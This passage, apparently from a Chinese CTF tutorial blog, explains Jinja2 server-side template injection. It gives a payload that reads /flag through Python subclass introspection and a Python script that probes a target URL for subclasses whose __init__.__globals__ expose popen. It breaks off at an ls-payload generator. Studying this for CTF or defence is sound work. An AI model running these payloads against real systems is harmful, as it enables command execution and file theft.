+</span></span><span class="line"><span class="cl">    <span class="c1"># 发送请求（添加超时+异常处理）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">verify</span><span class="o">=</span><span class="kc">False</span>  <span class="c1"># 如需验证SSL可改为True</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>  <span class="c1"># 非200状态码抛出异常</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">apparent_encoding</span>  <span class="c1"># 自动识别编码</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 匹配&lt;div class=&#34;result&#34;&gt;中包裹的列表内容</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;&lt;div class=&#34;result&#34;&gt;\s*\[(.*?)\]\s*&lt;/div&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="k">match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;错误：未找到匹配的类列表内容&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;响应内容预览：&#34;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">500</span><span class="p">])</span>  <span class="c1"># 打印预览帮助排查</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 提取并处理类列表字符串</span>
+</span></span><span class="line"><span class="cl">    <span class="n">classes_string</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 解码HTML实体 + 分割处理</span>
+</span></span><span class="line"><span class="cl">    <span class="n">classes</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">html</span><span class="o">.</span><span class="n">unescape</span><span class="p">(</span><span class="n">classes_string</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 查找目标类索引（添加异常处理）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">index</span> <span class="o">=</span> <span class="n">classes</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">target_class</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;✅ 找到目标类，索引是: </span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;❌ 请求错误：</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;❌ 未在列表中找到目标类：</span><span class="si">{</span><span class="n">target_class</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;当前找到的类列表前10项：&#34;</span><span class="p">,</span> <span class="n">classes</span><span class="p">[:</span><span class="mi">10</span><span class="p">]</span> <span class="k">if</span> <span class="s1">&#39;classes&#39;</span> <span class="ow">in</span> <span class="nb">locals</span><span class="p">()</span> <span class="k">else</span> <span class="s2">&#34;无&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;❌ 未知错误：</span><span class="si">{</span><span class="nb">type</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="o">.</span><span class="vm">__name__</span><span class="si">}</span><span class="s2"> - </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最终payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">121</span><span class="p">][</span><span class="s2">&#34;get_data&#34;</span><span class="p">](</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;/flag&#34;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="利用重载函数">利用重载函数
+</h3><p>比如高危函数：popen</p>
+<p>选择一个子类并初始化：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果结果带wrapper（指的是一个函数或方法被另一个函数替换或封装了，不再是其原生、未受限的版本）</p>
+<p>如：<code>&lt;slot wrapper '__init__' of 'object' objects&gt;</code></p>
+<p>说明没有重载，不能用，需要寻找不带wrapper的</p>
+<p>加载类下的可用函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">103</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们需要找到可用函数中包含popen的序列，所以查找可重载并筛选（可选）的任务可使用下面的脚本来进行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">html</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_subclasses_count</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;第一步：获取子类总数&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;{{&#39;&#39;.__class__.__base__.__subclasses__()}}&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;a&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">url</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">verify</span><span class="o">=</span><span class="kc">False</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">apparent_encoding</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 匹配子类列表</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;&lt;div class=&#34;result&#34;&gt;\s*\[(.*?)\]\s*&lt;/div&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="k">match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;❌ 未获取到子类列表，响应预览：&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">500</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 解析子类数量</span>
+</span></span><span class="line"><span class="cl">        <span class="n">classes_string</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">classes</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">html</span><span class="o">.</span><span class="n">unescape</span><span class="p">(</span><span class="n">classes_string</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">strip</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">count</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">classes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;✅ 第一步：成功获取到 </span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s2"> 个子类&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">count</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;❌ 获取子类数量失败：</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test_init_method</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;测试指定序号的__init__方法，返回是否含wrapper&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="se">{{{{</span><span class="s2">&#39;&#39;.__class__.__base__.__subclasses__()[</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">].__init__</span><span class="se">}}}}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;a&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">url</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">verify</span><span class="o">=</span><span class="kc">False</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">apparent_encoding</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 提取result区域的内容</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;&lt;div class=&#34;result&#34;&gt;\s*(.*?)\s*&lt;/div&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="k">match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">result_content</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">has_wrapper</span> <span class="o">=</span> <span class="s2">&#34;wrapper&#34;</span> <span class="ow">in</span> <span class="n">result_content</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">has_wrapper</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;⚠️  测试序号</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">时出错：</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">，已跳过&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test_popen_in_globals</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;测试指定序号的__init__.__globals__，返回是否含Popen及完整返回内容&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="se">{{{{</span><span class="s2">&#39;&#39;.__class__.__base__.__subclasses__()[</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">].__init__.__globals__</span><span class="se">}}}}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;a&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">url</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">verify</span><span class="o">=</span><span class="kc">False</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">apparent_encoding</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 提取result区域的内容</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;&lt;div class=&#34;result&#34;&gt;\s*(.*?)\s*&lt;/div&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="k">match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">result_content</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 判断是否包含Popen（大小写不敏感）</span>
+</span></span><span class="line"><span class="cl">        <span class="n">has_popen</span> <span class="o">=</span> <span class="s2">&#34;popen&#34;</span> <span class="ow">in</span> <span class="n">result_content</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">has_popen</span><span class="p">,</span> <span class="n">result_content</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;⚠️  检测序号</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">的Popen时出错：</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">，已跳过&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_ls_payload</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
